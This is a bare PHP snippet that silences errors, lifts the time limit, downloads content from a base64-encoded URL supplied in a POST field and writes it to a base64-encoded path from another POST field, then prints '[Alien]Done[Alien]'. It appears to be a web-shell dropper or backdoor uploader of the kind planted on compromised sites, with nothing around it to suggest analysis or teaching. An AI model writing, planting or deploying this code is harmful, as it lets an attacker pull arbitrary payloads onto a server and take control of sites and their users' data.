@ini_set('display_errors','0');
@set_time_limit(0);
$file = file_get_contents(base64_decode($_POST['url']));
file_put_contents(base64_decode($_POST['Alien2']), $file);
echo("[Alien]Done[Alien]");